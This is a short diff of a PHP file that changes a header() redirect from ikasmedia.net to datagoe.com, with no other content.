@@ -1,3 +1,3 @@
 <?php
-header ('Location:https://ikasmedia.net/');
+header ('Location:https://datagoe.com/');
 ?>
